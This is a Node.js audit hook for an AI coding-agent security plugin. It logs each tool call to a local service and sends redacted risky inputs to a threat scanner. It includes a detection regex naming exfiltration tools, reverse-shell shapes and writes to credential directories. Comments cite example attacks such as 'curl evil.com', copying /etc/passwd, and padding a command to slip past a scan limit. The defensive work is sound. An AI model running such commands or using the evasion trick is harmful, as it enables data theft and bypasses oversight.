#!/usr/bin/env node
/**
 * PostToolUse hook handler for the SecureVector Guard plugin.
 *
 * Fire-and-forget audit: after every tool call, POST a `tool_call_audit`
 * row to the local app with `runtime_kind: "claude-code"`. The hook never
 * blocks the host CLI — `postJsonAndForget` returns synchronously and
 * swallows every error.
 *
 * Both MCP and built-in (Bash / Edit / Read / etc.) tool names are
 * normalised to lookup candidates; unknown names short-circuit and emit
 * no audit row.
 *
 * Effect → audit action mapping (matches OpenClaw's audit table):
 *   allow  → "allow"
 *   deny   → "block"
 *   prompt → "log_only"
 *   no rule matched → "allow"
 *
 * Inlines a ~10 LOC redaction helper for `args_preview` to keep the
 * audit row useful for triage but free of obvious secrets. Conservative
 * substitution only — not a full DLP system.
 *
 * Zero npm deps. Native Node 18+.
 */

'use strict';

const { normalize } = require('../lib/normalize.js');
const { postJsonAndForget, fetchSyncedOverrides } = require('../lib/client.js');
const { SECRET_PATTERNS, redactForScan } = require('../lib/redact.js');

const DEFAULT_BASE_URL = 'http://127.0.0.1:8741';
const ARGS_PREVIEW_LIMIT = 200;
const RUNTIME_KIND = 'claude-code';

// Tools whose `tool_input` is worth scanning for threats. Read-only and
// metadata-only tools (Read, Glob, LS, Grep, TodoWrite, etc.) are
// excluded — their inputs don't carry exfil / injection payloads and
// scanning them is pure overhead. The list mirrors the categories of
// tools where the agent emits attacker-controllable content.
const THREAT_SCAN_TOOLS = new Set([
  'Bash',
  'PowerShell',
  'WebFetch',
  'Write',
  'Edit',
  'MultiEdit',
  'NotebookEdit',
  'Skill',
  'Task',
  'Agent',
]);
const THREAT_SCAN_TEXT_LIMIT = 8000; // bytes — well under /analyze's 100KB cap

// Bash-specific scan policy: OPT-IN. We only POST to /analyze when the
// command contains an explicit security-relevant marker — outbound
// network call, arbitrary code execution, destructive shell op, or a
// write into a sensitive system path. Everything else is presumed
// benign and skipped.
//
// Rationale: the rule engine's `data_leakage` matcher fires on any
// command that mentions a file path under /tmp, /var, /Users, etc.
// That includes routine developer noise — `wc -l file.patch`,
// `cd /Users/me/proj && grep …`, `DB="…" sqlite3 db ".tables"`. Sending
// those to /analyze floods the Threats UI with false positives that
// drown out real threats.
//
// Opt-in is safer for signal-to-noise — we accept missing some attack
// shapes (e.g. `cp /etc/passwd /tmp/leak` with no curl) in exchange
// for not crying wolf 50 times a day. Future hardening can extend the
// pattern set as new attack shapes emerge.
//
// Matches are case-insensitive and `\b`-anchored so they fire whether
// the marker is at the start, middle, or end of a pipeline.
const BASH_SCAN_MARKERS = new RegExp([
  // Outbound network — the canonical exfil shapes
  '\\b(?:curl|wget|nc|ncat|socat)\\b',
  // Arbitrary code execution from a shell string
  '\\b(?:bash|sh|zsh|dash|ksh)\\s+-c\\b',
  '\\b(?:eval|exec|source)\\b',
  '\\b(?:python|python3|node|deno|bun|perl|ruby|php)\\s+-[ce]\\b',
  // Destructive / privilege-elevating ops
  '\\brm\\s+-[rRf]+\\b',
  '\\bchmod\\s+\\+[xs]\\b',
  '\\bchown\\b',
  '\\bsudo\\b',
  // Writes into sensitive paths
  '>\\s*(?:/etc/|~?/\\.(?:ssh|aws|gcloud|gnupg|kube)/|/root/|/usr/local/bin/)',
  // Common reverse-shell shapes
  '/dev/tcp/',
  '\\bmkfifo\\b',
].join('|'), 'i');

// Returns true when a Bash command contains markers worth scanning.
// False = skip the /analyze POST (presumed benign). Empty/non-string
// inputs return false (nothing to scan).
function shouldScanBashCommand(command) {
  if (typeof command !== 'string' || command.length === 0) return false;
  return BASH_SCAN_MARKERS.test(command);
}

// `SECRET_PATTERNS` + `redactForScan` are imported from ../lib/redact.js
// so post-tool-use and user-prompt-submit can never drift apart on the
// secret surfaces they mask. The audit-preview variant below is a
// thin wrapper that adds the ARGS_PREVIEW_LIMIT truncation.

function redact(text) {
  return redactForScan(text).slice(0, ARGS_PREVIEW_LIMIT);
}

/**
 * Extract the natural-language CONTENT from a tool_input for /analyze.
 *
 * Prior versions sent `JSON.stringify(tool_input)` which dumped every
 * structural field — file_path, old_string, notebook_path, etc. — into
 * the rule engine. That produced two problems:
 *   1. Threat-rule false positives on routine path strings (e.g. a
 *      file_path of "/var/folders/..." would trip data_leakage).
 *   2. Sent more user content than the analyzer actually scans against,
 *      bloating threat_intel_records with structural JSON noise.
 *
 * The fix: extract only the field(s) carrying attacker-controllable or
 * agent-emitted text — for each supported tool, the canonical "what is
 * being written / executed / asked" field. For unknown shapes we return
 * an empty string and skip the scan (fail-closed: no analyse = no
 * false positives).
 *
 * Returns '' when no scannable text is found.
 */
function extractScanText(toolName, toolInput) {
  if (toolInput == null) return '';
  // String tool_input (rare) — assume it IS the content.
  if (typeof toolInput === 'string') return toolInput;
  if (typeof toolInput !== 'object') return '';

  switch (toolName) {
    case 'Bash':
    case 'PowerShell':
      // The command itself is the threat surface; description/cwd/etc.
      // are metadata only.
      return typeof toolInput.command === 'string' ? toolInput.command : '';
    case 'Write':
      return typeof toolInput.content === 'string' ? toolInput.content : '';
    case 'Edit':
      // new_string = what gets written to disk. old_string = existing
      // content (already on disk, not agent-emitted); file_path is a
      // path string that trips false-positive data_leakage rules.
      return typeof toolInput.new_string === 'string' ? toolInput.new_string : '';
    case 'MultiEdit': {
      if (!Array.isArray(toolInput.edits)) return '';
      return toolInput.edits
        .map(e => (e && typeof e.new_string === 'string' ? e.new_string : ''))
        .filter(Boolean)
        .join('\n');
    }
    case 'NotebookEdit':
      return typeof toolInput.new_source === 'string' ? toolInput.new_source : '';
    case 'WebFetch': {
      // The agent-supplied prompt is the injection vector; the URL is
      // metadata (and a path-shaped string that trips data_leakage).
      const parts = [];
      if (typeof toolInput.prompt === 'string') parts.push(toolInput.prompt);
      return parts.join('\n');
    }
    case 'Skill':
    case 'Task':
    case 'Agent': {
      // Any natural-language field — concatenated. Tool schemas vary
      // (Task has `prompt`/`description`; Skill has `args`; Agent has
      // `prompt`). Falls back to '' if none of the known fields exist.
      const parts = [];
      for (const k of ['prompt', 'description', 'instructions', 'message', 'args', 'input']) {
        const v = toolInput[k];
        if (typeof v === 'string' && v.length > 0) parts.push(v);
      }
      return parts.join('\n');
    }
    default:
      return '';
  }
}

function effectToAction(effect) {
  switch (effect) {
    case 'allow':  return 'allow';
    case 'deny':   return 'block';
    case 'prompt': return 'log_only';
    default:       return 'allow';
  }
}

function pickMatch(candidates, overrides) {
  if (!overrides || !Array.isArray(overrides.synced) || overrides.synced.length === 0) return null;
  const byId = new Map();
  for (const row of overrides.synced) {
    if (row && typeof row.tool_id === 'string' && !byId.has(row.tool_id)) {
      byId.set(row.tool_id, row);
    }
  }
  for (const c of candidates) {
    const m = byId.get(c);
    if (m) return { tool_id: c, ...m };
  }
  return null;
}

async function audit(event, baseUrl) {
  const toolName = (event && (event.tool_name || event.toolName)) || '';
  const candidates = normalize(toolName);
  if (candidates.length === 0) return; // unknown tool name — skip audit (fail-open)

  const overrides = await fetchSyncedOverrides(baseUrl);
  const match = pickMatch(candidates, overrides);

  const toolId = match ? match.tool_id : candidates[0];
  const reason = match && typeof match.reason === 'string' ? match.reason : null;
  const action = match ? effectToAction(match.effect) : 'allow';

  let argsPreview = '';
  try {
    const ti = event && (event.tool_input || event.toolInput);
    if (ti !== undefined && ti !== null) {
      argsPreview = redact(typeof ti === 'string' ? ti : JSON.stringify(ti));
    }
  } catch { /* swallow — empty preview is acceptable */ }

  postJsonAndForget(`${baseUrl}/api/tool-permissions/call-audit`, {
    tool_id: toolId,
    function_name: toolName,
    action,
    risk: null,
    reason,
    is_essential: false,
    args_preview: argsPreview || null,
    runtime_kind: RUNTIME_KIND,
  });

  // Threat-intel pass — only for high-risk tools whose `tool_input`
  // can carry attacker-controllable content (Bash commands, written
  // file bodies, fetched URLs). The /analyze endpoint runs the
  // existing rule packs (prompt-injection / exfil / secret-leak /
  // IDPI) and records any matches to threat_intel_records, surfacing
  // automatically in the Threats UI. Fire-and-forget; never blocks
  // the host CLI. Skipped entirely for low-risk tools (Read, Glob,
  // LS, Grep, etc.) to keep volume manageable.
  //
  // For Bash specifically, pre-filter routine read-only invocations
  // (ls/cat/grep/wc/git log/etc.) so we don't flood the Threats UI
  // with false-positive data_leakage hits on benign developer noise.
  // The full command string drives the filter, NOT the truncated
  // args_preview, so we don't miss the `curl evil.com` in
  // `ls /tmp/foo && curl evil.com`.
  if (THREAT_SCAN_TOOLS.has(toolName)) {
    // Build scanText from the per-tool TEXT FIELDS ONLY (not the full
    // JSON-stringified tool_input). The prior code dumped the whole
    // object — including file_path, notebook_path, old_string — into
    // the rule engine. That trips data_leakage rules on routine path
    // strings AND ships more user content than the analyzer scans
    // against. `extractScanText` returns only the agent-emitted text
    // (Bash command, Write content, Edit new_string, WebFetch prompt,
    // etc.) and returns '' for unrecognised shapes (fail-closed).
    let extractedText = '';
    let rawScanText = '';
    try {
      const ti = event && (event.tool_input || event.toolInput);
      extractedText = extractScanText(toolName, ti);
      rawScanText = redactForScan(extractedText);
    } catch { /* swallow */ }

    // Bash opt-in scan policy — run the marker check on the FULL,
    // pre-truncation command. Otherwise a payload like
    // "<8KB of benign text> && curl evil.com" would slip past the
    // marker check (the `curl` falls past THREAT_SCAN_TEXT_LIMIT).
    // Other high-risk tools (WebFetch, Write, etc.) always scan since
    // their inputs are inherently mutational or external.
    let shouldScan = rawScanText.length > 0;
    if (shouldScan && toolName === 'Bash') {
      try {
        if (!shouldScanBashCommand(extractedText)) shouldScan = false;
      } catch { /* on error, default to scanning — safer */ }
    }

    // Cap the POST body to THREAT_SCAN_TEXT_LIMIT (after redaction so
    // the truncation applies to the redacted text, not raw secrets).
    const scanText = rawScanText.length > THREAT_SCAN_TEXT_LIMIT
      ? rawScanText.slice(0, THREAT_SCAN_TEXT_LIMIT)
      : rawScanText;

    if (shouldScan) {
      postJsonAndForget(`${baseUrl}/analyze`, {
        text: scanText,
        source: 'claude-code-plugin',
        direction: 'outgoing',
        metadata: {
          runtime_kind: RUNTIME_KIND,
          tool_name: toolName,
          tool_id: toolId,
        },
      });
    }
  }
}


// --- stdin/stdout adapter (entry point) ---------------------------------

async function readAllStdin() {
  let buf = '';
  for await (const chunk of process.stdin) buf += chunk;
  return buf;
}

async function main() {
  let event = {};
  try {
    const raw = await readAllStdin();
    event = raw ? JSON.parse(raw) : {};
  } catch {
    // Malformed stdin — exit cleanly. PostToolUse has nothing to return
    // on stdout; the audit POST simply doesn't happen.
    return;
  }
  const baseUrl = process.env.SV_BASE_URL || DEFAULT_BASE_URL;
  try {
    await audit(event, baseUrl);
  } catch {
    // Belt-and-suspenders: never crash the hook process.
  }
}

if (require.main === module) {
  main();
}

module.exports = { redact, redactForScan, extractScanText, effectToAction, pickMatch, audit, shouldScanBashCommand, RUNTIME_KIND };
